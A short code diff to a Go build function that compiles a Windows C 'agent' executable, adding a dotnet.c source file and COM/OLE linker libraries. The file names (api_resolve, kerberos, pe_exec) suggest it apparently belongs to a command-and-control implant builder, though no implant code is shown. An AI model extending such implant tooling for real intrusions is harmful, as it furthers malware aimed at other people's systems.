@@ -569,6 +569,7 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 		filepath.Join(agentDir, "api_resolve.c"),
 		filepath.Join(agentDir, "kerberos.c"),
 		filepath.Join(agentDir, "pe_exec.c"),
+		filepath.Join(agentDir, "dotnet.c"),
 	}
 
 	args := []string{
@@ -586,7 +587,7 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 		"-o", outPath,
 	}
 	args = append(args, sources...)
-	args = append(args, "-lwinhttp", "-lbcrypt", "-lws2_32", "-lcrypt32", "-lsecur32", "-lgdi32")
+	args = append(args, "-lwinhttp", "-lbcrypt", "-lws2_32", "-lcrypt32", "-lsecur32", "-lgdi32", "-lole32", "-loleaut32")
 
 	cmd := exec.Command(cc, args...)
 	cmd.Dir = root
